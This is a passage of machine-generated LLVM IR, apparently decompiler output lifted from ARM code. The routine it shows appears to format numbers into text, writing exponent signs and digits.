  store i1 %v5_18734, i1* %cpsr_v.global-to-local, align 1
  %v6_18734 = icmp slt i32 %v1_18734, 0
  store i1 %v6_18734, i1* %cpsr_n.global-to-local, align 1
  %v7_18734 = icmp eq i32 %v0_18734, 103
  store i1 %v7_18734, i1* %cpsr_z.global-to-local, align 1
  %v3_18738 = add i32 %v2_18738, 1
  %v4_18738 = inttoptr i32 %v3_18738 to i8*
  store i8 0, i8* %v4_18738, align 1
  %v0_1873c = load i32, i32* %r1.global-to-local, align 4
  %v1_1873c = add i32 %v0_1873c, 1
  store i32 %v1_1873c, i32* %r1.global-to-local, align 4
  %v0_18740 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18740, label %dec_label_pc_18744, label %dec_label_pc_18774

dec_label_pc_18744:                               ; preds = %bb251
  %v0_18744 = load i32, i32* %r0.global-to-local, align 4
  %v1_18744 = load i32, i32* %ip.global-to-local, align 4
  %v2_18744 = sub i32 %v0_18744, %v1_18744
  %v4_18744 = xor i32 %v1_18744, %v0_18744
  %v5_18744 = xor i32 %v2_18744, %v0_18744
  %v6_18744 = and i32 %v5_18744, %v4_18744
  %v7_18744 = icmp slt i32 %v6_18744, 0
  %v8_18744 = icmp slt i32 %v2_18744, 0
  %v9_18744 = icmp eq i32 %v0_18744, %v1_18744
  %v3_18748 = xor i1 %v8_18744, %v7_18744
  %v4_18748 = or i1 %v9_18744, %v3_18748
  %.273 = zext i1 %v4_18748 to i32
  store i32 %.273, i32* %r3.global-to-local, align 4
  %v1_18750 = add i32 %v0_18744, 4
  %v3_18750 = sub i32 0, %v0_18744
  %v4_18750 = and i32 %v1_18750, %v3_18750
  %v5_18750 = icmp slt i32 %v4_18750, 0
  store i1 %v5_18750, i1* %cpsr_v.global-to-local, align 1
  %v6_18750 = icmp slt i32 %v1_18750, 0
  store i1 %v6_18750, i1* %cpsr_n.global-to-local, align 1
  %v7_18750 = icmp eq i32 %v1_18750, 0
  store i1 %v7_18750, i1* %cpsr_z.global-to-local, align 1
  %v2_18754 = xor i1 %v6_18750, %v5_18750
  br i1 %v2_18754, label %.thread21, label %bb254

.thread21:                                        ; preds = %dec_label_pc_18744
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread165

bb254:                                            ; preds = %dec_label_pc_18744
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18758 = icmp eq i1 %v4_18748, false
  store i1 %v2_18758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18758, label %.thread165, label %bb255

.thread165:                                       ; preds = %bb254, %.thread21
  %v1_187603551 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_187603551, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18780

bb255:                                            ; preds = %bb254
  %v3_1875c = sub i32 %v1_18744, %v0_18744
  store i32 %v3_1875c, i32* %ip.global-to-local, align 4
  store i32 102, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1878c

dec_label_pc_18774:                               ; preds = %bb251
  %v0_18774 = load i32, i32* %sl.global-to-local, align 4
  %v1_18774 = add i32 %v0_18774, -102
  %v3_18774 = sub i32 101, %v0_18774
  %v4_18774 = and i32 %v3_18774, %v0_18774
  %v5_18774 = icmp slt i32 %v4_18774, 0
  store i1 %v5_18774, i1* %cpsr_v.global-to-local, align 1
  %v6_18774 = icmp slt i32 %v1_18774, 0
  store i1 %v6_18774, i1* %cpsr_n.global-to-local, align 1
  %v7_18774 = icmp eq i32 %v0_18774, 102
  store i1 %v7_18774, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_18774, i32* %r7.global-to-local, align 4
  br i1 %v7_18774, label %dec_label_pc_18774.dec_label_pc_1878c_crit_edge, label %dec_label_pc_18780

dec_label_pc_18774.dec_label_pc_1878c_crit_edge:  ; preds = %dec_label_pc_18774
  %v0_1878c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1878c

dec_label_pc_18780:                               ; preds = %.thread165, %dec_label_pc_18774
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1879c

dec_label_pc_1878c:                               ; preds = %bb255, %dec_label_pc_18774.dec_label_pc_1878c_crit_edge
  %v0_1878c = phi i32 [ %v0_18744, %bb255 ], [ %v0_1878c.pre, %dec_label_pc_18774.dec_label_pc_1878c_crit_edge ]
  %stack_var_-184.3 = phi i32 [ %v3_1875c, %bb255 ], [ %v0_18664, %dec_label_pc_18774.dec_label_pc_1878c_crit_edge ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1878c = icmp slt i32 %v0_1878c, 0
  store i1 %v1_1878c, i1* %cpsr_n.global-to-local, align 1
  %v2_1878c = icmp eq i32 %v0_1878c, 0
  store i1 %v2_1878c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_1878c, label %bb256, label %bb257

bb256:                                            ; preds = %dec_label_pc_1878c
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_18794 = load i32, i32* %r2.global-to-local, align 4
  %v6_18794 = add i32 %v5_18794, -1
  %v7_18794 = inttoptr i32 %v6_18794 to i8*
  store i8 48, i8* %v7_18794, align 1
  %v8_18794 = load i32, i32* %r2.global-to-local, align 4
  %v9_18794 = add i32 %v8_18794, -1
  store i32 %v9_18794, i32* %r2.global-to-local, align 4
  %v0_18798.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_187c8.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_187cc.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_187cc.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb257

bb257:                                            ; preds = %dec_label_pc_1878c, %bb256
  %v1_187cc.pre = phi i1 [ %v1_187cc.pre.pre, %bb256 ], [ false, %dec_label_pc_1878c ]
  %v0_187cc.pre = phi i1 [ %v0_187cc.pre.pre, %bb256 ], [ false, %dec_label_pc_1878c ]
  %v1_187c8.pre = phi i32 [ %v1_187c8.pre.pre, %bb256 ], [ %v1_1873c, %dec_label_pc_1878c ]
  %v0_18798 = phi i32 [ %v0_18798.pre, %bb256 ], [ %v0_1878c, %dec_label_pc_1878c ]
  store i32 %v0_18798, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1879c

dec_label_pc_1879c:                               ; preds = %dec_label_pc_18780, %bb257
  %v0_18834 = phi i32 [ 0, %dec_label_pc_18780 ], [ %v0_18798, %bb257 ]
  %v1_187d0 = phi i1 [ false, %dec_label_pc_18780 ], [ %v1_187cc.pre, %bb257 ]
  %v0_187d0 = phi i1 [ false, %dec_label_pc_18780 ], [ %v0_187cc.pre, %bb257 ]
  %v1_187c8 = phi i32 [ %v1_1873c, %dec_label_pc_18780 ], [ %v1_187c8.pre, %bb257 ]
  %v1_188f0 = phi i32 [ %v0_18664, %dec_label_pc_18780 ], [ %stack_var_-184.3, %bb257 ]
  store i32 1, i32* %stack_var_-160, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_187a8 = ptrtoint i32* %stack_var_-38 to i32
  store i32 %v2_187a8, i32* %r3.global-to-local, align 4
  %v0_187b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_187b4 = inttoptr i32 %v0_187b4 to i8*
  %v2_187b4 = load i8, i8* %v1_187b4, align 1
  %v3_187b4 = zext i8 %v2_187b4 to i32
  store i32 %v3_187b4, i32* %r3.global-to-local, align 4
  %v5_187b4 = add i32 %v0_187b4, 1
  store i32 %v5_187b4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_187b4, i32* %stack_var_-38, align 4
  %v2_187c8 = sub i32 %v1_187c8, %v5_187b4
  store i32 %v2_187c8, i32* %r1.global-to-local, align 4
  %v2_187cc = xor i1 %v1_187d0, %v0_187d0
  br i1 %v2_187cc, label %.thread167, label %dec_label_pc_187d4

.thread167:                                       ; preds = %dec_label_pc_1879c
  %v5_187cc = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v5_187cc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18844

dec_label_pc_187d4:                               ; preds = %dec_label_pc_1879c
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_187d8 = sub i32 %v0_18834, %v2_187c8
  %v4_187d8 = xor i32 %v2_187c8, %v0_18834
  %v5_187d8 = xor i32 %v2_187d8, %v0_18834
  %v6_187d8 = and i32 %v5_187d8, %v4_187d8
  %v7_187d8 = icmp slt i32 %v6_187d8, 0
  store i1 %v7_187d8, i1* %cpsr_v.global-to-local, align 1
  %v8_187d8 = icmp slt i32 %v2_187d8, 0
  store i1 %v8_187d8, i1* %cpsr_n.global-to-local, align 1
  %v9_187d8 = icmp eq i32 %v0_18834, %v2_187c8
  store i1 %v9_187d8, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-152, align 4
  %v2_187e4 = xor i1 %v8_187d8, %v7_187d8
  br i1 %v2_187e4, label %dec_label_pc_18820, label %dec_label_pc_187e8

dec_label_pc_187e8:                               ; preds = %dec_label_pc_187d4
  store i32 %v2_187d8, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_187d8, i1* %cpsr_n.global-to-local, align 1
  %v2_187ec = icmp eq i32 %v2_187d8, 0
  store i1 %v2_187ec, i1* %cpsr_z.global-to-local, align 1
  %v2_187f4 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_187f4, i32* %lr.global-to-local, align 4
  %tmp258 = icmp slt i32 %v2_187d8, 1
  br i1 %tmp258, label %.thread169, label %dec_label_pc_18800

.thread169:                                       ; preds = %dec_label_pc_187e8
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18840

dec_label_pc_18800:                               ; preds = %dec_label_pc_187e8
  store i32 ptrtoint (i32* @global_var_22f7b.1556 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_1880c = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_1880c, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-140, align 4
  br label %dec_label_pc_18844

dec_label_pc_18820:                               ; preds = %dec_label_pc_187d4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_18820 = icmp slt i32 %v0_18834, 0
  store i1 %v1_18820, i1* %cpsr_n.global-to-local, align 1
  %v2_18820 = icmp eq i32 %v0_18834, 0
  store i1 %v2_18820, i1* %cpsr_z.global-to-local, align 1
  %v2_18824 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_18824, i32* %lr.global-to-local, align 4
  %tmp259 = icmp slt i32 %v0_18834, 1
  br i1 %tmp259, label %dec_label_pc_18840, label %dec_label_pc_18830

dec_label_pc_18830:                               ; preds = %dec_label_pc_18820
  %v2_18834 = sub i32 %v2_187c8, %v0_18834
  store i32 %v2_18834, i32* %r1.global-to-local, align 4
  %v2_18838 = add i32 %v5_187b4, %v0_18834
  store i32 %v2_18838, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18840

dec_label_pc_18840:                               ; preds = %dec_label_pc_18830, %.thread169, %dec_label_pc_18820
  %storemerge181.in = phi i32* [ %stack_var_-152, %dec_label_pc_18820 ], [ %stack_var_-140, %.thread169 ], [ %stack_var_-140, %dec_label_pc_18830 ]
  %v0_18858102 = phi i32 [ %v2_187c8, %dec_label_pc_18820 ], [ 0, %.thread169 ], [ %v2_18834, %dec_label_pc_18830 ]
  %storemerge181 = ptrtoint i32* %storemerge181.in to i32
  store i32 %storemerge181, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18844

dec_label_pc_18844:                               ; preds = %.thread167, %dec_label_pc_18800, %dec_label_pc_18840
  %v1_1887c = phi i32 [ %v2_1880c, %dec_label_pc_18800 ], [ %storemerge181, %dec_label_pc_18840 ], [ %v5_187cc, %.thread167 ]
  %v0_18894110 = phi i32 [ -1, %dec_label_pc_18800 ], [ -1, %dec_label_pc_18840 ], [ %v0_18834, %.thread167 ]
  %v0_18858 = phi i32 [ 0, %dec_label_pc_18800 ], [ %v0_18858102, %dec_label_pc_18840 ], [ %v2_187c8, %.thread167 ]
  %v2_18844 = load i32, i32* %stack_var_-200, align 4
  store i32 %v2_18844, i32* %r2.global-to-local, align 4
  %v1_18848 = add i32 %v2_18844, 12
  %v2_18848 = inttoptr i32 %v1_18848 to i32*
  %v3_18848 = load i32, i32* %v2_18848, align 4
  %v1_1884c = and i32 %v3_18848, 16
  store i32 %v1_1884c, i32* %lr.global-to-local, align 4
  %v2_1884c = icmp eq i32 %v1_1884c, 0
  %tmp282 = zext i1 %v2_1884c to i32
  %.274 = xor i32 %tmp282, 1
  store i32 %.274, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_18858 = icmp slt i32 %v0_18858, 0
  store i1 %v1_18858, i1* %cpsr_n.global-to-local, align 1
  %v2_18858 = icmp eq i32 %v0_18858, 0
  store i1 %v2_18858, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18858, label %bb262, label %.thread40

.thread40:                                        ; preds = %dec_label_pc_18844
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18878

bb262:                                            ; preds = %dec_label_pc_18844
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_1884c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1884c, label %dec_label_pc_18868, label %dec_label_pc_18878

dec_label_pc_18868:                               ; preds = %bb262
  store i32 %v1_188f0, i32* %r3.global-to-local, align 4
  %v0_1886c = load i32, i32* %sl.global-to-local, align 4
  %v1_1886c = add i32 %v0_1886c, -103
  %v3_1886c = sub i32 102, %v0_1886c
  %v4_1886c = and i32 %v3_1886c, %v0_1886c
  %v5_1886c = icmp slt i32 %v4_1886c, 0
  store i1 %v5_1886c, i1* %cpsr_v.global-to-local, align 1
  %v6_1886c = icmp slt i32 %v1_1886c, 0
  store i1 %v6_1886c, i1* %cpsr_n.global-to-local, align 1
  %v7_1886c = icmp eq i32 %v0_1886c, 103
  store i1 %v7_1886c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1886c, label %dec_label_pc_18894, label %bb263

bb263:                                            ; preds = %dec_label_pc_18868
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_18870 = icmp slt i32 %v1_188f0, 0
  store i1 %v2_18870, i1* %cpsr_n.global-to-local, align 1
  %v3_18870 = icmp eq i32 %v1_188f0, 0
  store i1 %v3_18870, i1* %cpsr_z.global-to-local, align 1
  %tmp264 = icmp slt i32 %v1_188f0, 1
  br i1 %tmp264, label %dec_label_pc_18894, label %dec_label_pc_18878

dec_label_pc_18878:                               ; preds = %.thread40, %bb262, %bb263
  %v2_1887c = inttoptr i32 %v1_1887c to i32*
  store i32 112, i32* %v2_1887c, align 4
  %v1_18884 = load i32, i32* %r6.global-to-local, align 4
  %v2_18884 = add i32 %v1_18884, 4
  %v3_18884 = inttoptr i32 %v2_18884 to i32*
  store i32 1, i32* %v3_18884, align 4
  store i32 ptrtoint (i32* @global_var_22f88.1558 to i32), i32* %r3.global-to-local, align 4
  %v1_1888c = load i32, i32* %r6.global-to-local, align 4
  %v2_1888c = add i32 %v1_1888c, 8
  %v3_1888c = inttoptr i32 %v2_1888c to i32*
  store i32 ptrtoint (i32* @global_var_22f88.1558 to i32), i32* %v3_1888c, align 4
  %v0_18890 = load i32, i32* %r6.global-to-local, align 4
  %v1_18890 = add i32 %v0_18890, 12
  store i32 %v1_18890, i32* %r6.global-to-local, align 4
  %v0_18894.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18894

dec_label_pc_18894:                               ; preds = %dec_label_pc_18868, %bb263, %dec_label_pc_18878
  %v1_188a0 = phi i32 [ %v1_1887c, %bb263 ], [ %v1_18890, %dec_label_pc_18878 ], [ %v1_1887c, %dec_label_pc_18868 ]
  %v0_18894 = phi i32 [ %v0_18894110, %bb263 ], [ %v0_18894.pre, %dec_label_pc_18878 ], [ %v0_18894110, %dec_label_pc_18868 ]
  %v1_18894 = add i32 %v0_18894, 1
  store i32 %v1_18894, i32* %ip.global-to-local, align 4
  %v3_18894 = sub i32 0, %v0_18894
  %v4_18894 = and i32 %v1_18894, %v3_18894
  %v5_18894 = icmp slt i32 %v4_18894, 0
  store i1 %v5_18894, i1* %cpsr_v.global-to-local, align 1
  %v6_18894 = icmp slt i32 %v1_18894, 0
  store i1 %v6_18894, i1* %cpsr_n.global-to-local, align 1
  %v7_18894 = icmp eq i32 %v1_18894, 0
  store i1 %v7_18894, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18894, label %dec_label_pc_188b8, label %dec_label_pc_1889c

dec_label_pc_1889c:                               ; preds = %dec_label_pc_18894
  %v1_1889c = sub i32 -1, %v0_18894
  %v2_188a0 = add i32 %v1_188a0, 4
  %v3_188a0 = inttoptr i32 %v2_188a0 to i32*
  store i32 %v1_1889c, i32* %v3_188a0, align 4
  store i32 ptrtoint (i32* @global_var_22f7b.1556 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_188ac = load i32, i32* %r6.global-to-local, align 4
  %v2_188ac = inttoptr i32 %v1_188ac to i32*
  store i32 176, i32* %v2_188ac, align 4
  %v0_188b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_188b0 = load i32, i32* %r6.global-to-local, align 4
  %v2_188b0 = add i32 %v1_188b0, 8
  %v3_188b0 = inttoptr i32 %v2_188b0 to i32*
  store i32 %v0_188b0, i32* %v3_188b0, align 4
  %v0_188b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_188b4 = add i32 %v0_188b4, 12
  store i32 %v1_188b4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_188b8

dec_label_pc_188b8:                               ; preds = %dec_label_pc_18894, %dec_label_pc_1889c
  %v2_188c0 = phi i32 [ %v1_188a0, %dec_label_pc_18894 ], [ %v1_188b4, %dec_label_pc_1889c ]
  %v0_188b8 = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_188b8 = icmp slt i32 %v0_188b8, 0
  store i1 %v1_188b8, i1* %cpsr_n.global-to-local, align 1
  %v2_188b8 = icmp eq i32 %v0_188b8, 0
  store i1 %v2_188b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_188b8, label %.thread49, label %bb265

bb265:                                            ; preds = %dec_label_pc_188b8
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_188c0 = inttoptr i32 %v2_188c0 to i32*
  store i32 112, i32* %v3_188c0, align 4
  %v1_188c4 = load i32, i32* %r4.global-to-local, align 4
  %v2_188c4 = load i32, i32* %r6.global-to-local, align 4
  %v3_188c4 = add i32 %v2_188c4, 8
  %v4_188c4 = inttoptr i32 %v3_188c4 to i32*
  store i32 %v1_188c4, i32* %v4_188c4, align 4
  %v1_188c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_188c8 = load i32, i32* %r6.global-to-local, align 4
  %v3_188c8 = add i32 %v2_188c8, 4
  %v4_188c8 = inttoptr i32 %v3_188c8 to i32*
  store i32 %v1_188c8, i32* %v4_188c8, align 4
  %v1_188cc = load i32, i32* %r6.global-to-local, align 4
  %v2_188cc = add i32 %v1_188cc, 12
  store i32 %v2_188cc, i32* %r6.global-to-local, align 4
  br label %.thread49

.thread49:                                        ; preds = %dec_label_pc_188b8, %bb265
  %v1_188f4 = phi i32 [ %v2_188c0, %dec_label_pc_188b8 ], [ %v2_188cc, %bb265 ]
  %v0_188d0 = load i32, i32* %sl.global-to-local, align 4
  %v1_188d0 = add i32 %v0_188d0, -103
  %v3_188d0 = sub i32 102, %v0_188d0
  %v4_188d0 = and i32 %v3_188d0, %v0_188d0
  %v5_188d0 = icmp slt i32 %v4_188d0, 0
  store i1 %v5_188d0, i1* %cpsr_v.global-to-local, align 1
  %v6_188d0 = icmp slt i32 %v1_188d0, 0
  store i1 %v6_188d0, i1* %cpsr_n.global-to-local, align 1
  %v7_188d0 = icmp eq i32 %v0_188d0, 103
  store i1 %v7_188d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_188d0, label %dec_label_pc_188d8, label %dec_label_pc_188e0

dec_label_pc_188d8:                               ; preds = %.thread49
  %v0_188d8 = load i32, i32* %lr.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_188d8 = icmp slt i32 %v0_188d8, 0
  store i1 %v1_188d8, i1* %cpsr_n.global-to-local, align 1
  %v2_188d8 = icmp eq i32 %v0_188d8, 0
  store i1 %v2_188d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_188d8, label %dec_label_pc_1890c, label %dec_label_pc_188e0

dec_label_pc_188e0:                               ; preds = %.thread49, %dec_label_pc_188d8
  %v0_188e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_188e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_188e0 = sub i32 %v1_188e0, %v0_188e0
  store i32 %v2_188e0, i32* %r3.global-to-local, align 4
  store i32 %v1_188f0, i32* %ip.global-to-local, align 4
  %v2_188e8 = sub i32 %v2_188e0, %v1_188f0
  %v4_188e8 = xor i32 %v2_188e0, %v1_188f0
  %v5_188e8 = xor i32 %v2_188e8, %v2_188e0
  %v6_188e8 = and i32 %v5_188e8, %v4_188e8
  %v7_188e8 = icmp slt i32 %v6_188e8, 0
  store i1 %v7_188e8, i1* %cpsr_v.global-to-local, align 1
  %v8_188e8 = icmp slt i32 %v2_188e8, 0
  store i1 %v8_188e8, i1* %cpsr_n.global-to-local, align 1
  %v9_188e8 = icmp eq i32 %v2_188e0, %v1_188f0
  store i1 %v9_188e8, i1* %cpsr_z.global-to-local, align 1
  %v2_188ec = xor i1 %v8_188e8, %v7_188e8
  br i1 %v2_188ec, label %dec_label_pc_188f0, label %dec_label_pc_1890c

dec_label_pc_188f0:                               ; preds = %dec_label_pc_188e0
  %v2_188f0 = sub i32 %v1_188f0, %v2_188e0
  %v2_188f4 = add i32 %v1_188f4, 4
  %v3_188f4 = inttoptr i32 %v2_188f4 to i32*
  store i32 %v2_188f0, i32* %v3_188f4, align 4
  store i32 ptrtoint (i32* @global_var_22f7b.1556 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_18900 = load i32, i32* %r6.global-to-local, align 4
  %v2_18900 = inttoptr i32 %v1_18900 to i32*
  store i32 176, i32* %v2_18900, align 4
  %v0_18904 = load i32, i32* %r3.global-to-local, align 4
  %v1_18904 = load i32, i32* %r6.global-to-local, align 4
  %v2_18904 = add i32 %v1_18904, 8
  %v3_18904 = inttoptr i32 %v2_18904 to i32*
  store i32 %v0_18904, i32* %v3_18904, align 4
  %v0_18908 = load i32, i32* %r6.global-to-local, align 4
  %v1_18908 = add i32 %v0_18908, 12
  store i32 %v1_18908, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1890c

dec_label_pc_1890c:                               ; preds = %dec_label_pc_188e0, %dec_label_pc_188d8, %dec_label_pc_188f0
  %v1_189a0.pre.pre = phi i32 [ %v1_188f4, %dec_label_pc_188e0 ], [ %v1_188f4, %dec_label_pc_188d8 ], [ %v1_18908, %dec_label_pc_188f0 ]
  %v0_1890c = load i32, i32* %r7.global-to-local, align 4
  %v1_1890c = add i32 %v0_1890c, -102
  %v3_1890c = sub i32 101, %v0_1890c
  %v4_1890c = and i32 %v3_1890c, %v0_1890c
  %v5_1890c = icmp slt i32 %v4_1890c, 0
  store i1 %v5_1890c, i1* %cpsr_v.global-to-local, align 1
  %v6_1890c = icmp slt i32 %v1_1890c, 0
  store i1 %v6_1890c, i1* %cpsr_n.global-to-local, align 1
  %v7_1890c = icmp eq i32 %v0_1890c, 102
  store i1 %v7_1890c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1890c, label %dec_label_pc_18994, label %dec_label_pc_18914

dec_label_pc_18914:                               ; preds = %dec_label_pc_1890c
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18918 = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_18918 = icmp slt i32 %v0_18918, 0
  store i1 %v1_18918, i1* %cpsr_n.global-to-local, align 1
  %v2_18918 = icmp eq i32 %v0_18918, 0
  store i1 %v2_18918, i1* %cpsr_z.global-to-local, align 1
  store i32 %stack_var_-58.0131138, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-43, align 4
  %v4_1892c = sub i32 0, %v0_18918
  %storemerge180 = select i1 %v1_18918, i32 %v4_1892c, i32 %v0_18918
  %tmp283 = ashr i32 %v0_18918, 31
  %tmp284 = and i32 %tmp283, 2
  %tmp285 = add nuw nsw i32 %tmp284, 43
  store i32 %storemerge180, i32* %r4.global-to-local, align 4
  store i32 %tmp285, i32* %sl.global-to-local, align 4
  %v2_18934 = ptrtoint i32* %stack_var_-43 to i32
  store i32 %v2_18934, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1893c

dec_label_pc_1893c:                               ; preds = %dec_label_pc_1896c, %dec_label_pc_1893c, %dec_label_pc_18914
  %v2_18954 = phi i32 [ %v2_18934, %dec_label_pc_18914 ], [ %v6_18954, %dec_label_pc_1893c ], [ %v6_18954, %dec_label_pc_1896c ]
  %v0_18950 = phi i32 [ %storemerge180, %dec_label_pc_18914 ], [ %v2_18958, %dec_label_pc_1893c ], [ %v2_18958, %dec_label_pc_1896c ]
  %v2_18944 = srem i32 %v0_18950, 10
  %v1_18948 = add nsw i32 %v2_18944, 48
  store i32 %v1_18948, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v0_18950, i32* %r0.global-to-local, align 4
  %v1_18954 = trunc i32 %v1_18948 to i8
  %v3_18954 = add i32 %v2_18954, -1
  %v4_18954 = inttoptr i32 %v3_18954 to i8*
  store i8 %v1_18954, i8* %v4_18954, align 1
  %v5_18954 = load i32, i32* %r5.global-to-local, align 4
  %v6_18954 = add i32 %v5_18954, -1
  store i32 %v6_18954, i32* %r5.global-to-local, align 4
  %v0_18958 = load i32, i32* %r0.global-to-local, align 4
  %v1_18958 = load i32, i32* %r1.global-to-local, align 4
  %v2_18958 = sdiv i32 %v0_18958, %v1_18958
  store i32 %v2_18958, i32* %r0.global-to-local, align 4
  %v0_1895c = load i32, i32* %r7.global-to-local, align 4
  %v1_1895c = add i32 %v0_1895c, 1
  store i32 %v1_1895c, i32* %r7.global-to-local, align 4
  %v1_18960 = add i32 %v0_1895c, -2
  %v3_18960 = sub i32 1, %v0_1895c
  %v4_18960 = and i32 %v3_18960, %v1_1895c
  %v5_18960 = icmp slt i32 %v4_18960, 0
  store i1 %v5_18960, i1* %cpsr_v.global-to-local, align 1
  %v6_18960 = icmp slt i32 %v1_18960, 0
  store i1 %v6_18960, i1* %cpsr_n.global-to-local, align 1
  %v7_18960 = icmp eq i32 %v1_1895c, 3
  store i1 %v7_18960, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_18958, i32* %r4.global-to-local, align 4
  %v7_18968 = icmp slt i32 %v1_1895c, 4
  br i1 %v7_18968, label %dec_label_pc_1893c, label %dec_label_pc_1896c

dec_label_pc_1896c:                               ; preds = %dec_label_pc_1893c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1896c = icmp slt i32 %v2_18958, 0
  store i1 %v1_1896c, i1* %cpsr_n.global-to-local, align 1
  %v2_1896c = icmp eq i32 %v2_18958, 0
  store i1 %v2_1896c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1896c, label %dec_label_pc_18974, label %dec_label_pc_1893c

dec_label_pc_18974:                               ; preds = %dec_label_pc_1896c
  %v1_18974 = add i32 %v5_18954, -2
  store i32 %v1_18974, i32* %r3.global-to-local, align 4
  %v0_18978 = load i32, i32* %sl.global-to-local, align 4
  %v1_18978 = trunc i32 %v0_18978 to i8
  %v4_18978 = inttoptr i32 %v1_18974 to i8*
  store i8 %v1_18978, i8* %v4_18978, align 1
  %v0_1897c = load i32, i32* %r3.global-to-local, align 4
  %v1_1897c = add i32 %v0_1897c, -1
  store i32 %v1_1897c, i32* %r2.global-to-local, align 4
  %v0_18980 = load i32, i32* %r8.global-to-local, align 4
  %v1_18980 = trunc i32 %v0_18980 to i8
  %v4_18980 = inttoptr i32 %v1_1897c to i8*
  store i8 %v1_18980, i8* %v4_18980, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_18988 = load i32, i32* %r6.global-to-local, align 4
  %v1_18988 = inttoptr i32 %v0_18988 to i32*
  store i32 112, i32* %v1_18988, align 4
  %v3_18988 = add i32 %v0_18988, 4
  %v4_18988 = inttoptr i32 %v3_18988 to i32*
  %v5_18988 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_18988, i32* %v4_18988, align 4
  %v0_1898c = load i32, i32* %r2.global-to-local, align 4
  %v1_1898c = load i32, i32* %r6.global-to-local, align 4
  %v2_1898c = add i32 %v1_1898c, 8
  %v3_1898c = inttoptr i32 %v2_1898c to i32*
